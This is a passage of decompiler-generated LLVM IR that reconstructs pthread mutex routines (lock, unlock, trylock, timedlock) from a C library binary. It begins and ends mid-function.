  %v0_8059dfc = phi i32 [ ptrtoint (i32* @global_var_8074340.617 to i32), %dec_label_pc_8059dd5 ], [ ptrtoint (i32* @global_var_8074160 to i32), %entry ], [ %v2_8059df6, %dec_label_pc_8059df0 ]
  ret i32 %v0_8059dfc

; uselistorder directives
  uselistorder label %dec_label_pc_8059dfc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8059df0, { 1, 0 }
}

define i32 @pthread_mutex_unlock(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8059dfd = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8059e05 = add i32 %arg1, 12
  %v2_8059e05 = inttoptr i32 %v1_8059e05 to i32*
  %v3_8059e05 = load i32, i32* %v2_8059e05, align 4
  %v1_8059e08 = add i32 %v3_8059e05, -1
  %v5_8059e08 = icmp eq i32 %v3_8059e05, 0
  %v9_8059e08 = icmp eq i32 %v1_8059e08, 0
  br i1 %v9_8059e08, label %dec_label_pc_8059e26, label %dec_label_pc_8059e0d

dec_label_pc_8059e0d:                             ; preds = %entry
  %v6_8059e08 = sub i32 0, %v3_8059e05
  %v7_8059e08 = and i32 %v3_8059e05, %v6_8059e08
  %v8_8059e08 = icmp slt i32 %v7_8059e08, 0
  %v10_8059e08 = icmp slt i32 %v1_8059e08, 0
  %v3_8059e0d = icmp eq i1 %v10_8059e08, %v8_8059e08
  br i1 %v3_8059e0d, label %dec_label_pc_8059e15, label %dec_label_pc_8059e0f

dec_label_pc_8059e0f:                             ; preds = %dec_label_pc_8059e0d
  br i1 %v5_8059e08, label %dec_label_pc_8059e46, label %dec_label_pc_8059e1f

dec_label_pc_8059e15:                             ; preds = %dec_label_pc_8059e0d
  %v9_8059e15 = icmp eq i32 %v3_8059e05, 2
  br i1 %v9_8059e15, label %dec_label_pc_8059e59, label %dec_label_pc_8059e1a

dec_label_pc_8059e1a:                             ; preds = %dec_label_pc_8059e15
  %v9_8059e1a = icmp eq i32 %v3_8059e05, 3
  br i1 %v9_8059e1a, label %dec_label_pc_8059e70, label %dec_label_pc_8059e1f

dec_label_pc_8059e1f:                             ; preds = %dec_label_pc_8059e0f, %dec_label_pc_8059e1a
  br label %dec_label_pc_8059e83

dec_label_pc_8059e26:                             ; preds = %entry
  %v1_8059e26 = call i32 @thread_self.18(i32 %v0_8059dfd)
  %v0_8059e2b = load i32, i32* @ebx, align 4
  %v1_8059e2b = add i32 %v0_8059e2b, 8
  %v2_8059e2b = inttoptr i32 %v1_8059e2b to i32*
  %v3_8059e2b = load i32, i32* %v2_8059e2b, align 4
  %v15_8059e2b = icmp eq i32 %v3_8059e2b, %v1_8059e26
  %v1_8059e2e = icmp eq i1 %v15_8059e2b, false
  br i1 %v1_8059e2e, label %dec_label_pc_8059e7e, label %dec_label_pc_8059e30

dec_label_pc_8059e30:                             ; preds = %dec_label_pc_8059e26
  %v1_8059e30 = add i32 %v0_8059e2b, 4
  %v2_8059e30 = inttoptr i32 %v1_8059e30 to i32*
  %v3_8059e30 = load i32, i32* %v2_8059e30, align 4
  %tmp12 = icmp slt i32 %v3_8059e30, 1
  br i1 %tmp12, label %dec_label_pc_8059e3f, label %dec_label_pc_8059e37

dec_label_pc_8059e37:                             ; preds = %dec_label_pc_8059e30
  %v1_8059e37 = add i32 %v3_8059e30, -1
  store i32 %v1_8059e37, i32* %v2_8059e30, align 4
  br label %dec_label_pc_8059e83

dec_label_pc_8059e3f:                             ; preds = %dec_label_pc_8059e30
  store i32 0, i32* %v2_8059e2b, align 4
  %v0_8059e49.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8059e46

dec_label_pc_8059e46:                             ; preds = %dec_label_pc_8059e0f, %dec_label_pc_8059e3f
  %v0_8059e49 = phi i32 [ %arg1, %dec_label_pc_8059e0f ], [ %v0_8059e49.pre, %dec_label_pc_8059e3f ]
  %v1_8059e49 = add i32 %v0_8059e49, 16
  %v1_8059e4d = inttoptr i32 %v1_8059e49 to i32*
  %v2_8059e4d = call i32 @__pthread_unlock(i32* %v1_8059e4d)
  br label %dec_label_pc_8059e52

dec_label_pc_8059e52:                             ; preds = %dec_label_pc_8059e70, %dec_label_pc_8059e46
  br label %dec_label_pc_8059e83

dec_label_pc_8059e59:                             ; preds = %dec_label_pc_8059e15
  %v1_8059e59 = call i32 @thread_self.18(i32 %v0_8059dfd)
  %v0_8059e5e = load i32, i32* @ebx, align 4
  %v1_8059e5e = add i32 %v0_8059e5e, 8
  %v2_8059e5e = inttoptr i32 %v1_8059e5e to i32*
  %v3_8059e5e = load i32, i32* %v2_8059e5e, align 4
  %v15_8059e5e = icmp eq i32 %v3_8059e5e, %v1_8059e59
  %v1_8059e61 = icmp eq i1 %v15_8059e5e, false
  br i1 %v1_8059e61, label %dec_label_pc_8059e7e, label %dec_label_pc_8059e63

dec_label_pc_8059e63:                             ; preds = %dec_label_pc_8059e59
  %v1_8059e63 = add i32 %v0_8059e5e, 16
  %v2_8059e63 = inttoptr i32 %v1_8059e63 to i32*
  %v3_8059e63 = load i32, i32* %v2_8059e63, align 4
  %v4_8059e63 = icmp eq i32 %v3_8059e63, 0
  br i1 %v4_8059e63, label %dec_label_pc_8059e7e, label %dec_label_pc_8059e69

dec_label_pc_8059e69:                             ; preds = %dec_label_pc_8059e63
  store i32 0, i32* %v2_8059e5e, align 4
  %v0_8059e73.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8059e70

dec_label_pc_8059e70:                             ; preds = %dec_label_pc_8059e1a, %dec_label_pc_8059e69
  %v0_8059e73 = phi i32 [ %arg1, %dec_label_pc_8059e1a ], [ %v0_8059e73.pre, %dec_label_pc_8059e69 ]
  %v1_8059e73 = add i32 %v0_8059e73, 16
  %v1_8059e77 = inttoptr i32 %v1_8059e73 to i32*
  %v2_8059e77 = call i32 @__pthread_alt_unlock(i32* %v1_8059e77)
  br label %dec_label_pc_8059e52

dec_label_pc_8059e7e:                             ; preds = %dec_label_pc_8059e63, %dec_label_pc_8059e59, %dec_label_pc_8059e26
  br label %dec_label_pc_8059e83

dec_label_pc_8059e83:                             ; preds = %dec_label_pc_8059e52, %dec_label_pc_8059e37, %dec_label_pc_8059e1f, %dec_label_pc_8059e7e
  %v0_8059e86 = phi i32 [ 0, %dec_label_pc_8059e52 ], [ 0, %dec_label_pc_8059e37 ], [ 22, %dec_label_pc_8059e1f ], [ 1, %dec_label_pc_8059e7e ]
  store i32 %v0_8059dfd, i32* @ebx, align 4
  ret i32 %v0_8059e86

; uselistorder directives
  uselistorder i32 %v3_8059e30, { 1, 0 }
  uselistorder i32 %v1_8059e08, { 1, 0 }
  uselistorder i32 %v3_8059e05, { 0, 1, 4, 5, 3, 2 }
  uselistorder i32 %v0_8059dfd, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8059e83, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8059e70, { 1, 0 }
  uselistorder label %dec_label_pc_8059e46, { 1, 0 }
  uselistorder label %dec_label_pc_8059e1f, { 1, 0 }
}

define i32 @__pthread_once_fork_parent() local_unnamed_addr {
entry:
  %v1_8059e8f = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8078e88.676 to i32))
  ret i32 %v1_8059e8f
}

define i32 @pthread_mutex_trylock(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8059e98 = load i32, i32* @edi, align 4
  %v0_8059e99 = load i32, i32* @esi, align 4
  %v0_8059e9a = load i32, i32* @ebx, align 4
  store i32 %v0_8059e9a, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8059e9f = add i32 %arg1, 12
  %v2_8059e9f = inttoptr i32 %v1_8059e9f to i32*
  %v3_8059e9f = load i32, i32* %v2_8059e9f, align 4
  %v1_8059ea2 = add i32 %v3_8059e9f, -1
  %v5_8059ea2 = icmp eq i32 %v3_8059e9f, 0
  %v9_8059ea2 = icmp eq i32 %v1_8059ea2, 0
  br i1 %v9_8059ea2, label %dec_label_pc_8059ecb, label %dec_label_pc_8059ea7

dec_label_pc_8059ea7:                             ; preds = %entry
  %v6_8059ea2 = sub i32 0, %v3_8059e9f
  %v7_8059ea2 = and i32 %v3_8059e9f, %v6_8059ea2
  %v8_8059ea2 = icmp slt i32 %v7_8059ea2, 0
  %v10_8059ea2 = icmp slt i32 %v1_8059ea2, 0
  %v3_8059ea7 = icmp eq i1 %v10_8059ea2, %v8_8059ea2
  br i1 %v3_8059ea7, label %dec_label_pc_8059eaf, label %dec_label_pc_8059ea9

dec_label_pc_8059ea9:                             ; preds = %dec_label_pc_8059ea7
  br i1 %v5_8059ea2, label %dec_label_pc_8059ec0, label %dec_label_pc_8059eb9

dec_label_pc_8059eaf:                             ; preds = %dec_label_pc_8059ea7
  %v9_8059eaf = icmp eq i32 %v3_8059e9f, 2
  br i1 %v9_8059eaf, label %dec_label_pc_8059ef8, label %dec_label_pc_8059eb4

dec_label_pc_8059eb4:                             ; preds = %dec_label_pc_8059eaf
  %v9_8059eb4 = icmp eq i32 %v3_8059e9f, 3
  br i1 %v9_8059eb4, label %dec_label_pc_8059f10, label %dec_label_pc_8059eb9

dec_label_pc_8059eb9:                             ; preds = %dec_label_pc_8059ea9, %dec_label_pc_8059eb4
  store i32 22, i32* @esi, align 4
  br label %dec_label_pc_8059f1b

dec_label_pc_8059ec0:                             ; preds = %dec_label_pc_8059ea9
  %v1_8059ec0 = add i32 %arg1, 16
  store i32 %v1_8059ec0, i32* @eax, align 4
  store i32 %v0_8059e9a, i32* @ebx, align 4
  %v3_8059ec6 = call i32 @__pthread_trylock(i32 %v0_8059e9a, i32 %v0_8059e99, i32 %v0_8059e98)
  %v0_8059ecb.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8059ecb

dec_label_pc_8059ecb:                             ; preds = %entry, %dec_label_pc_8059ec0
  %v0_8059ecb = phi i32 [ %v0_8059e9a, %entry ], [ %v0_8059ecb.pre, %dec_label_pc_8059ec0 ]
  %v1_8059ecb = call i32 @thread_self.18(i32 %v0_8059ecb)
  store i32 %v1_8059ecb, i32* %edi.global-to-local, align 4
  %v0_8059ed2 = load i32, i32* @ebx, align 4
  %v1_8059ed2 = add i32 %v0_8059ed2, 8
  %v2_8059ed2 = inttoptr i32 %v1_8059ed2 to i32*
  %v3_8059ed2 = load i32, i32* %v2_8059ed2, align 4
  %v15_8059ed2 = icmp eq i32 %v3_8059ed2, %v1_8059ecb
  %v1_8059ed5 = icmp eq i1 %v15_8059ed2, false
  br i1 %v1_8059ed5, label %dec_label_pc_8059ede, label %dec_label_pc_8059ed7

dec_label_pc_8059ed7:                             ; preds = %dec_label_pc_8059ecb
  %v1_8059ed7 = add i32 %v0_8059ed2, 4
  %v2_8059ed7 = inttoptr i32 %v1_8059ed7 to i32*
  %v3_8059ed7 = load i32, i32* %v2_8059ed7, align 4
  %v4_8059ed7 = add i32 %v3_8059ed7, 1
  store i32 %v4_8059ed7, i32* %v2_8059ed7, align 4
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8059f1b

dec_label_pc_8059ede:                             ; preds = %dec_label_pc_8059ecb
  %v1_8059ede = add i32 %v0_8059ed2, 16
  store i32 %v1_8059ede, i32* @eax, align 4
  %v0_8059ee1 = load i32, i32* %stack_var_-12, align 4
  %v3_8059ee1 = call i32 @__pthread_trylock(i32 %v0_8059ee1, i32 %v0_8059e99, i32 %v0_8059e98)
  store i32 %v3_8059ee1, i32* @esi, align 4
  %v1_8059ee8 = icmp eq i32 %v3_8059ee1, 0
  %v1_8059eea = icmp eq i1 %v1_8059ee8, false
  br i1 %v1_8059eea, label %dec_label_pc_8059f1b, label %dec_label_pc_8059eec

dec_label_pc_8059eec:                             ; preds = %dec_label_pc_8059ede
  %v0_8059eec = load i32, i32* %edi.global-to-local, align 4
  %v1_8059eec = load i32, i32* @ebx, align 4
  %v2_8059eec = add i32 %v1_8059eec, 8
  %v3_8059eec = inttoptr i32 %v2_8059eec to i32*
  store i32 %v0_8059eec, i32* %v3_8059eec, align 4
  %v0_8059eef = load i32, i32* @ebx, align 4
  %v1_8059eef = add i32 %v0_8059eef, 4
  %v2_8059eef = inttoptr i32 %v1_8059eef to i32*
  store i32 0, i32* %v2_8059eef, align 4
  br label %dec_label_pc_8059f1b

dec_label_pc_8059ef8:                             ; preds = %dec_label_pc_8059eaf
  %v1_8059ef8 = add i32 %arg1, 16
  store i32 %v1_8059ef8, i32* @eax, align 4
  %v3_8059efb = call i32 @__pthread_alt_trylock(i32 %v0_8059e9a, i32 %v0_8059e99, i32 %v0_8059e98)
  store i32 %v3_8059efb, i32* @esi, align 4
  %v1_8059f02 = icmp eq i32 %v3_8059efb, 0
  %v1_8059f04 = icmp eq i1 %v1_8059f02, false
  br i1 %v1_8059f04, label %dec_label_pc_8059f1b, label %dec_label_pc_8059f06

dec_label_pc_8059f06:                             ; preds = %dec_label_pc_8059ef8
  %v0_8059f06 = load i32, i32* %stack_var_-12, align 4
  %v1_8059f06 = call i32 @thread_self.18(i32 %v0_8059f06)
  %v1_8059f0b = load i32, i32* @ebx, align 4
  %v2_8059f0b = add i32 %v1_8059f0b, 8
  %v3_8059f0b = inttoptr i32 %v2_8059f0b to i32*
  store i32 %v1_8059f06, i32* %v3_8059f0b, align 4
  br label %dec_label_pc_8059f1b

dec_label_pc_8059f10:                             ; preds = %dec_label_pc_8059eb4
  %v1_8059f10 = add i32 %arg1, 16
  store i32 %v1_8059f10, i32* @eax, align 4
  store i32 %v0_8059e9a, i32* @ebx, align 4
  %v3_8059f16 = call i32 @__pthread_alt_trylock(i32 %v0_8059e9a, i32 %v0_8059e99, i32 %v0_8059e98)
  br label %dec_label_pc_8059f1b

dec_label_pc_8059f1b:                             ; preds = %dec_label_pc_8059ef8, %dec_label_pc_8059ede, %dec_label_pc_8059f06, %dec_label_pc_8059eec, %dec_label_pc_8059ed7, %dec_label_pc_8059eb9, %dec_label_pc_8059f10
  %v0_8059f1b = load i32, i32* @esi, align 4
  %v2_8059f1d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8059f1d, i32* @ebx, align 4
  store i32 %v0_8059e99, i32* @esi, align 4
  store i32 %v0_8059e98, i32* @edi, align 4
  ret i32 %v0_8059f1b

; uselistorder directives
  uselistorder i32 %v1_8059ea2, { 1, 0 }
  uselistorder i32 %v3_8059e9f, { 0, 1, 4, 5, 3, 2 }
  uselistorder i32 %v0_8059e9a, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 %v0_8059e99, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_8059e98, { 0, 3, 2, 1, 4 }
  uselistorder i32* %stack_var_-12, { 3, 1, 2, 0, 4 }
  uselistorder i32 (i32, i32, i32)* @__pthread_alt_trylock, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_8059f1b, { 6, 2, 0, 3, 1, 4, 5 }
  uselistorder label %dec_label_pc_8059ecb, { 1, 0 }
  uselistorder label %dec_label_pc_8059eb9, { 1, 0 }
}

define i32 @pthread_mutex_timedlock(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8059f23 = load i32, i32* @ebx, align 4
  store i32 %v0_8059f23, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_8059f2c = add i32 %arg2, 4
  %v2_8059f2c = inttoptr i32 %v1_8059f2c to i32*
  %v3_8059f2c = load i32, i32* %v2_8059f2c, align 4
  %v6_8059f33 = icmp ugt i32 %v3_8059f2c, 999999999
  br i1 %v6_8059f33, label %dec_label_pc_8059fce, label %dec_label_pc_8059f39

dec_label_pc_8059f39:                             ; preds = %entry
  %v1_8059f39 = add i32 %arg1, 12
  %v2_8059f39 = inttoptr i32 %v1_8059f39 to i32*
  %v3_8059f39 = load i32, i32* %v2_8059f39, align 4
  %v1_8059f3c = add i32 %v3_8059f39, -1
  %v5_8059f3c = icmp eq i32 %v3_8059f39, 0
  %v9_8059f3c = icmp eq i32 %v1_8059f3c, 0
  br i1 %v9_8059f3c, label %dec_label_pc_8059f64, label %dec_label_pc_8059f41

dec_label_pc_8059f41:                             ; preds = %dec_label_pc_8059f39
  %v6_8059f3c = sub i32 0, %v3_8059f39
  %v7_8059f3c = and i32 %v3_8059f39, %v6_8059f3c
  %v8_8059f3c = icmp slt i32 %v7_8059f3c, 0
  %v10_8059f3c = icmp slt i32 %v1_8059f3c, 0
  %v3_8059f41 = icmp eq i1 %v10_8059f3c, %v8_8059f3c
  br i1 %v3_8059f41, label %dec_label_pc_8059f4c, label %dec_label_pc_8059f43

dec_label_pc_8059f43:                             ; preds = %dec_label_pc_8059f41
  br i1 %v5_8059f3c, label %dec_label_pc_8059f58, label %dec_label_pc_8059fce

dec_label_pc_8059f4c:                             ; preds = %dec_label_pc_8059f41
  %v9_8059f4c = icmp eq i32 %v3_8059f39, 2
  br i1 %v9_8059f4c, label %dec_label_pc_8059f8d, label %dec_label_pc_8059f51

dec_label_pc_8059f51:                             ; preds = %dec_label_pc_8059f4c
  %v9_8059f51 = icmp eq i32 %v3_8059f39, 3
  %v1_8059f54 = icmp eq i1 %v9_8059f51, false
  br i1 %v1_8059f54, label %dec_label_pc_8059fce, label %dec_label_pc_8059fb6

dec_label_pc_8059f58:                             ; preds = %dec_label_pc_8059f43
  %v1_8059f58 = add i32 %arg1, 16
  store i32 %v1_8059f58, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v1_8059f5d = call i32 @__pthread_lock(i32 %v0_8059f23)
  br label %dec_label_pc_8059f73

dec_label_pc_8059f64:                             ; preds = %dec_label_pc_8059f39
  %v1_8059f64 = call i32 @thread_self.18(i32 %v0_8059f23)
  store i32 %v1_8059f64, i32* @ebx, align 4
  %v0_8059f6b = load i32, i32* @esi, align 4
  %v1_8059f6b = add i32 %v0_8059f6b, 8
  %v2_8059f6b = inttoptr i32 %v1_8059f6b to i32*
  %v3_8059f6b = load i32, i32* %v2_8059f6b, align 4
  %v15_8059f6b = icmp eq i32 %v3_8059f6b, %v1_8059f64
  %v1_8059f6e = icmp eq i1 %v15_8059f6b, false
  br i1 %v1_8059f6e, label %dec_label_pc_8059f77, label %dec_label_pc_8059f70

dec_label_pc_8059f70:                             ; preds = %dec_label_pc_8059f64
  %v1_8059f70 = add i32 %v0_8059f6b, 4
  %v2_8059f70 = inttoptr i32 %v1_8059f70 to i32*
  %v3_8059f70 = load i32, i32* %v2_8059f70, align 4
  %v4_8059f70 = add i32 %v3_8059f70, 1
  store i32 %v4_8059f70, i32* %v2_8059f70, align 4
  br label %dec_label_pc_8059f73

dec_label_pc_8059f73:                             ; preds = %dec_label_pc_8059fb1, %dec_label_pc_8059f77, %dec_label_pc_8059f58, %dec_label_pc_8059f70
  br label %dec_label_pc_8059fda

dec_label_pc_8059f77:                             ; preds = %dec_label_pc_8059f64
  %v1_8059f77 = add i32 %v0_8059f6b, 16
  store i32 %v1_8059f77, i32* @eax, align 4
  store i32 %v1_8059f64, i32* @edx, align 4
  %v0_8059f7c = load i32, i32* %stack_var_-12, align 4
  %v1_8059f7c = call i32 @__pthread_lock(i32 %v0_8059f7c)
  %v0_8059f81 = load i32, i32* @ebx, align 4
  %v1_8059f81 = load i32, i32* @esi, align 4
  %v2_8059f81 = add i32 %v1_8059f81, 8
  %v3_8059f81 = inttoptr i32 %v2_8059f81 to i32*
  store i32 %v0_8059f81, i32* %v3_8059f81, align 4
  %v0_8059f84 = load i32, i32* @esi, align 4
  %v1_8059f84 = add i32 %v0_8059f84, 4
  %v2_8059f84 = inttoptr i32 %v1_8059f84 to i32*
  store i32 0, i32* %v2_8059f84, align 4
  br label %dec_label_pc_8059f73

dec_label_pc_8059f8d:                             ; preds = %dec_label_pc_8059f4c
  %v1_8059f8d = call i32 @thread_self.18(i32 %v0_8059f23)
  store i32 %v1_8059f8d, i32* @ebx, align 4
  %v0_8059f99 = load i32, i32* @esi, align 4
  %v1_8059f99 = add i32 %v0_8059f99, 8
  %v2_8059f99 = inttoptr i32 %v1_8059f99 to i32*
  %v3_8059f99 = load i32, i32* %v2_8059f99, align 4
  %v15_8059f99 = icmp eq i32 %v3_8059f99, %v1_8059f8d
  br i1 %v15_8059f99, label %dec_label_pc_8059fda, label %dec_label_pc_8059f9e

dec_label_pc_8059f9e:                             ; preds = %dec_label_pc_8059f8d
  %v1_8059f9f = add i32 %v0_8059f99, 16
  %v0_8059fa2 = load i32, i32* @edi, align 4
  %v4_8059fa5 = inttoptr i32 %v1_8059f9f to i32*
  %v5_8059fa5 = call i32 @__pthread_alt_timedlock(i32* %v4_8059fa5, i32 %v1_8059f8d, i32 %v0_8059fa2, i32 %v1_8059f8d)
  %v1_8059fad = icmp eq i32 %v5_8059fa5, 0
  br i1 %v1_8059fad, label %dec_label_pc_8059fd5, label %dec_label_pc_8059fb1

dec_label_pc_8059fb1:                             ; preds = %dec_label_pc_8059f9e
  %v0_8059fb1 = load i32, i32* @ebx, align 4
  %v1_8059fb1 = load i32, i32* @esi, align 4
  %v2_8059fb1 = add i32 %v1_8059fb1, 8
  %v3_8059fb1 = inttoptr i32 %v2_8059fb1 to i32*
  store i32 %v0_8059fb1, i32* %v3_8059fb1, align 4
  br label %dec_label_pc_8059f73

dec_label_pc_8059fb6:                             ; preds = %dec_label_pc_8059f51
  %v1_8059fb6 = add i32 %arg1, 16
  %v0_8059fb9 = load i32, i32* @ecx, align 4
  %v4_8059fbe = inttoptr i32 %v1_8059fb6 to i32*
  %v5_8059fbe = call i32 @__pthread_alt_timedlock(i32* %v4_8059fbe, i32 0, i32 %arg2, i32 %v0_8059fb9)
  %v1_8059fc8 = icmp eq i32 %v5_8059fbe, 0
  %v1_8059fca = icmp eq i1 %v1_8059fc8, false
  br i1 %v1_8059fca, label %dec_label_pc_8059fda, label %dec_label_pc_8059fd5

dec_label_pc_8059fce:                             ; preds = %dec_label_pc_8059f43, %dec_label_pc_8059f51, %entry
  br label %dec_label_pc_8059fda

dec_label_pc_8059fd5:                             ; preds = %dec_label_pc_8059fb6, %dec_label_pc_8059f9e
  br label %dec_label_pc_8059fda

dec_label_pc_8059fda:                             ; preds = %dec_label_pc_8059fb6, %dec_label_pc_8059f8d, %dec_label_pc_8059fce, %dec_label_pc_8059f73, %dec_label_pc_8059fd5
  %v0_8059fda = phi i32 [ 0, %dec_label_pc_8059fb6 ], [ 35, %dec_label_pc_8059f8d ], [ 22, %dec_label_pc_8059fce ], [ 0, %dec_label_pc_8059f73 ], [ 110, %dec_label_pc_8059fd5 ]
  ret i32 %v0_8059fda

; uselistorder directives
  uselistorder i32 %v1_8059f8d, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8059f64, { 1, 0, 2 }
  uselistorder i32 %v1_8059f3c, { 1, 0 }
  uselistorder i32 %v3_8059f39, { 0, 1, 4, 5, 3, 2 }
  uselistorder i32 %v0_8059f23, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8059fda, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8059fce, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8059f73, { 0, 1, 3, 2 }
}

define i32 @pthread_mutex_lock(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8059fe0 = load i32, i32* @esi, align 4
  %v0_8059fe1 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_8059fe9 = add i32 %arg1, 12
  %v2_8059fe9 = inttoptr i32 %v1_8059fe9 to i32*
  %v3_8059fe9 = load i32, i32* %v2_8059fe9, align 4
  %v1_8059fec = add i32 %v3_8059fe9, -1
  %v5_8059fec = icmp eq i32 %v3_8059fe9, 0
  %v9_8059fec = icmp eq i32 %v1_8059fec, 0
  br i1 %v9_8059fec, label %dec_label_pc_805a016, label %dec_label_pc_8059ff1

dec_label_pc_8059ff1:                             ; preds = %entry
  %v6_8059fec = sub i32 0, %v3_8059fe9
  %v7_8059fec = and i32 %v3_8059fe9, %v6_8059fec
  %v8_8059fec = icmp slt i32 %v7_8059fec, 0
  %v10_8059fec = icmp slt i32 %v1_8059fec, 0
  %v3_8059ff1 = icmp eq i1 %v10_8059fec, %v8_8059fec
  br i1 %v3_8059ff1, label %dec_label_pc_8059ff9, label %dec_label_pc_8059ff3

dec_label_pc_8059ff3:                             ; preds = %dec_label_pc_8059ff1
  br i1 %v5_8059fec, label %dec_label_pc_805a00a, label %dec_label_pc_805a003

dec_label_pc_8059ff9:                             ; preds = %dec_label_pc_8059ff1
  %v9_8059ff9 = icmp eq i32 %v3_8059fe9, 2
  br i1 %v9_8059ff9, label %dec_label_pc_805a03f, label %dec_label_pc_8059ffe

dec_label_pc_8059ffe:                             ; preds = %dec_label_pc_8059ff9
  %v9_8059ffe = icmp eq i32 %v3_8059fe9, 3
  br i1 %v9_8059ffe, label %dec_label_pc_805a061, label %dec_label_pc_805a003

dec_label_pc_805a003:                             ; preds = %dec_label_pc_8059ff3, %dec_label_pc_8059ffe
  br label %dec_label_pc_805a073

dec_label_pc_805a00a:                             ; preds = %dec_label_pc_8059ff3
  %v1_805a00a = add i32 %arg1, 16
  store i32 %v1_805a00a, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v1_805a00f = call i32 @__pthread_lock(i32 %v0_8059fe1)
  br label %dec_label_pc_805a025

dec_label_pc_805a016:                             ; preds = %entry
  %v1_805a016 = call i32 @thread_self.18(i32 %v0_8059fe1)
  store i32 %v1_805a016, i32* @ebx, align 4
  %v0_805a01d = load i32, i32* @esi, align 4
  %v1_805a01d = add i32 %v0_805a01d, 8
  %v2_805a01d = inttoptr i32 %v1_805a01d to i32*
  %v3_805a01d = load i32, i32* %v2_805a01d, align 4
  %v15_805a01d = icmp eq i32 %v3_805a01d, %v1_805a016
  %v1_805a020 = icmp eq i1 %v15_805a01d, false
  br i1 %v1_805a020, label %dec_label_pc_805a029, label %dec_label_pc_805a022

dec_label_pc_805a022:                             ; preds = %dec_label_pc_805a016
  %v1_805a022 = add i32 %v0_805a01d, 4
  %v2_805a022 = inttoptr i32 %v1_805a022 to i32*
  %v3_805a022 = load i32, i32* %v2_805a022, align 4
  %v4_805a022 = add i32 %v3_805a022, 1
  store i32 %v4_805a022, i32* %v2_805a022, align 4
  br label %dec_label_pc_805a025

dec_label_pc_805a025:                             ; preds = %dec_label_pc_805a029, %dec_label_pc_805a00a, %dec_label_pc_805a022
  br label %dec_label_pc_805a073

dec_label_pc_805a029:                             ; preds = %dec_label_pc_805a016
  %v1_805a029 = add i32 %v0_805a01d, 16
  store i32 %v1_805a029, i32* @eax, align 4
  store i32 %v1_805a016, i32* @edx, align 4
  %v1_805a02e = call i32 @__pthread_lock(i32 %v0_8059fe1)
  %v0_805a033 = load i32, i32* @ebx, align 4
  %v1_805a033 = load i32, i32* @esi, align 4
  %v2_805a033 = add i32 %v1_805a033, 8
  %v3_805a033 = inttoptr i32 %v2_805a033 to i32*
  store i32 %v0_805a033, i32* %v3_805a033, align 4
  %v0_805a036 = load i32, i32* @esi, align 4
  %v1_805a036 = add i32 %v0_805a036, 4
  %v2_805a036 = inttoptr i32 %v1_805a036 to i32*
  store i32 0, i32* %v2_805a036, align 4
  br label %dec_label_pc_805a025

dec_label_pc_805a03f:                             ; preds = %dec_label_pc_8059ff9
  %v1_805a03f = call i32 @thread_self.18(i32 %v0_8059fe1)
  store i32 %v1_805a03f, i32* @ebx, align 4
  %v0_805a04b = load i32, i32* @esi, align 4
  %v1_805a04b = add i32 %v0_805a04b, 8
  %v2_805a04b = inttoptr i32 %v1_805a04b to i32*
  %v3_805a04b = load i32, i32* %v2_805a04b, align 4
  %v15_805a04b = icmp eq i32 %v3_805a04b, %v1_805a03f
  br i1 %v15_805a04b, label %dec_label_pc_805a073, label %dec_label_pc_805a050

dec_label_pc_805a050:                             ; preds = %dec_label_pc_805a03f
  %v1_805a052 = add i32 %v0_805a04b, 16
  %v3_805a057 = inttoptr i32 %v1_805a052 to i32*
  %v4_805a057 = call i32 @__pthread_alt_lock(i32* %v3_805a057, i32 %v1_805a03f, i32 35)
  %v0_805a05c = load i32, i32* @ebx, align 4
  %v1_805a05c = load i32, i32* @esi, align 4
  %v2_805a05c = add i32 %v1_805a05c, 8
  %v3_805a05c = inttoptr i32 %v2_805a05c to i32*
  store i32 %v0_805a05c, i32* %v3_805a05c, align 4
  br label %dec_label_pc_805a06e

dec_label_pc_805a061:                             ; preds = %dec_label_pc_8059ffe
  %v1_805a061 = add i32 %arg1, 16
  %v0_805a064 = load i32, i32* @ecx, align 4
  %v3_805a069 = inttoptr i32 %v1_805a061 to i32*
  %v4_805a069 = call i32 @__pthread_alt_lock(i32* %v3_805a069, i32 0, i32 %v0_805a064)
  br label %dec_label_pc_805a06e

dec_label_pc_805a06e:                             ; preds = %dec_label_pc_805a050, %dec_label_pc_805a061
  br label %dec_label_pc_805a073

dec_label_pc_805a073:                             ; preds = %dec_label_pc_805a03f, %dec_label_pc_805a025, %dec_label_pc_805a003, %dec_label_pc_805a06e
  %v0_805a076 = phi i32 [ 35, %dec_label_pc_805a03f ], [ 0, %dec_label_pc_805a025 ], [ 22, %dec_label_pc_805a003 ], [ 0, %dec_label_pc_805a06e ]
  %v2_805a073 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805a073, i32* @edx, align 4
  store i32 %v0_8059fe1, i32* @ebx, align 4
  store i32 %v0_8059fe0, i32* @esi, align 4
  ret i32 %v0_805a076

